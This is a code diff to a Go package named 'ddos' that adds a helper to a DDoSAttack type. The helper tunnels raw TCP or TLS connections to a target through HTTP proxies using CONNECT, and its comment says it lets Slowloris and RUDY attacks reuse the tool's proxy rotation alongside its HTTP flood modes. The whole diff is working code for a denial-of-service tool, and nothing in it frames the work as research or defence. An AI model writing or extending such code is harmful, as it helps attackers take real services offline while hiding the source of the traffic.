@@ -1,10 +1,13 @@
 package ddos
 
 import (
+	"bufio"
 	"crypto/tls"
 	"fmt"
+	"io"
 	"net"
 	"net/http"
+	"net/url"
 	"strings"
 	"time"
 
@@ -68,6 +71,107 @@ func (d *DDoSAttack) createTLSConfig() *tls.Config {
 	}
 
 	return config
+}
+
+// dialThroughHTTPProxy establishes a TCP (optionally TLS-wrapped) connection to the
+// target host:port through an HTTP proxy using the CONNECT method.
+//
+// This helper is used by low-level TCP attacks (e.g. Slowloris, RUDY) so they can
+// reuse the same proxy rotation and health-checking logic as the HTTP flood modes.
+func (d *DDoSAttack) dialThroughHTTPProxy(
+	dialer *net.Dialer,
+	proxyURL string,
+	targetHost string,
+	targetPort string,
+	useTLS bool,
+) (net.Conn, error) {
+	parsed, err := url.Parse(proxyURL)
+	if err != nil {
+		return nil, fmt.Errorf("invalid proxy URL %q: %w", proxyURL, err)
+	}
+
+	// Only plain HTTP proxies are supported for raw TCP attacks.
+	if parsed.Scheme != "http" {
+		return nil, fmt.Errorf("unsupported proxy scheme %q for raw TCP attacks", parsed.Scheme)
+	}
+
+	proxyHost := parsed.Host
+	if !strings.Contains(proxyHost, ":") {
+		// Default to port 80 when not specified
+		proxyHost = net.JoinHostPort(parsed.Hostname(), "80")
+	}
+
+	// Connect to proxy
+	conn, err := dialer.Dial("tcp", proxyHost)
+	if err != nil {
+		return nil, fmt.Errorf("failed to connect to proxy %q: %w", proxyHost, err)
+	}
+
+	targetAddr := net.JoinHostPort(targetHost, targetPort)
+
+	// Send CONNECT request
+	connectReq := fmt.Sprintf(
+		"CONNECT %s HTTP/1.1\r\nHost: %s\r\nProxy-Connection: keep-alive\r\n\r\n",
+		targetAddr,
+		targetAddr,
+	)
+
+	if _, err := conn.Write([]byte(connectReq)); err != nil {
+		conn.Close()
+		return nil, fmt.Errorf("failed to write CONNECT request: %w", err)
+	}
+
+	// Read proxy response headers
+	br := bufio.NewReader(conn)
+
+	statusLine, err := br.ReadString('\n')
+	if err != nil {
+		conn.Close()
+		return nil, fmt.Errorf("failed to read proxy response: %w", err)
+	}
+
+	// Expect 200 status for successful tunnel
+	if !strings.Contains(statusLine, "200") {
+		// Drain remaining headers before closing
+		for {
+			line, err := br.ReadString('\n')
+			if err != nil || line == "\r\n" || line == "\n" {
+				break
+			}
+		}
+		conn.Close()
+		return nil, fmt.Errorf("proxy CONNECT failed: %s", strings.TrimSpace(statusLine))
+	}
+
+	// Drain the rest of the headers
+	for {
+		line, err := br.ReadString('\n')
+		if err != nil {
+			if err == io.EOF {
+				break
+			}
+			conn.Close()
+			return nil, fmt.Errorf("failed reading proxy headers: %w", err)
+		}
+		if line == "\r\n" || line == "\n" {
+			break
+		}
+	}
+
+	// At this point we have a tunnel to targetHost:targetPort over conn.
+	if !useTLS {
+		return conn, nil
+	}
+
+	// Wrap the tunneled connection with TLS.
+	tlsConfig := d.createTLSConfig()
+	tlsConn := tls.Client(conn, tlsConfig)
+	if err := tlsConn.Handshake(); err != nil {
+		conn.Close()
+		return nil, fmt.Errorf("TLS handshake over proxy failed: %w", err)
+	}
+
+	return tlsConn, nil
 }
 
 // shouldUseTLS determines if TLS should be used based on URL or ForceTLS flag
